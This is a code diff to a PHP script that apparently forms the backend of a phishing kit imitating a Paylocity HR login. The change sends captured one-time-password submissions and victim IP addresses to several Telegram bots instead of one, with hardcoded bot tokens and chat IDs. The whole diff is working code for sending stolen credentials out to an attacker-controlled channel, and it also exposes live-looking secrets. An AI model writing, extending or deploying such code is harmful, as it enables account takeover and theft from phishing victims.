@@ -4,8 +4,21 @@ $db = pg_connect("host=pg-paycity-paylocityhr0-25.l.aivencloud.com port=19042 db
 
 
 // Telegram configuration
-define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
-define('TELEGRAM_CHAT_ID', '1325797388');
+// define('TELEGRAM_BOT_TOKEN', '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY');
+// define('TELEGRAM_CHAT_ID', '1325797388');
+
+
+$telegram_bots = [
+    [
+        'token' => '7592386357:AAF6MXHo5VlYbiCKY0SNVIKQLqd_S-k4_sY',
+        'chat_id' => '1325797388'
+    ],
+    [
+        'token' => '7635810313:AAEDfJcy11V0VdcAp_q07BKr2g7lj_nneNI',
+        'chat_id' => '8160582785'
+    ]
+    // Add more bots here if needed
+];
 
 
 
@@ -32,23 +45,48 @@ $telegram_message = "📝 *Confirm OTP Submission*:\n\n".
                     "💬 *IP:* $ip";
                     
 
-$telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
+// $telegram_url = "https://api.telegram.org/bot".TELEGRAM_BOT_TOKEN."/sendMessage";
 
-// Send message using CURL (allows better error handling)
-$data = [
-    'chat_id' => TELEGRAM_CHAT_ID,
-    'text' => $telegram_message,
-    'parse_mode' => 'Markdown'
-];
+// // Send message using CURL (allows better error handling)
+// $data = [
+//     'chat_id' => TELEGRAM_CHAT_ID,
+//     'text' => $telegram_message,
+//     'parse_mode' => 'Markdown'
+// ];
 
-$ch = curl_init();
-curl_setopt($ch, CURLOPT_URL, $telegram_url);
-curl_setopt($ch, CURLOPT_POST, 1);
-curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
-curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+// $ch = curl_init();
+// curl_setopt($ch, CURLOPT_URL, $telegram_url);
+// curl_setopt($ch, CURLOPT_POST, 1);
+// curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+// curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
 
-$response = curl_exec($ch);
-curl_close($ch);
+// $response = curl_exec($ch);
+// curl_close($ch);
+
+
+
+function sendMessageToTelegramBots($message, $bots) {
+    foreach ($bots as $bot) {
+        $telegram_url = "https://api.telegram.org/bot" . $bot['token'] . "/sendMessage";
+
+        $data = [
+            'chat_id' => $bot['chat_id'],
+            'text' => $message,
+            'parse_mode' => 'Markdown'
+        ];
+
+        $ch = curl_init();
+        curl_setopt($ch, CURLOPT_URL, $telegram_url);
+        curl_setopt($ch, CURLOPT_POST, 1);
+        curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
+        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+        curl_exec($ch);
+        curl_close($ch);
+    }
+}
+
+// Send text message to Telegram
+sendMessageToTelegramBots($telegram_message, $telegram_bots);
 
 
 
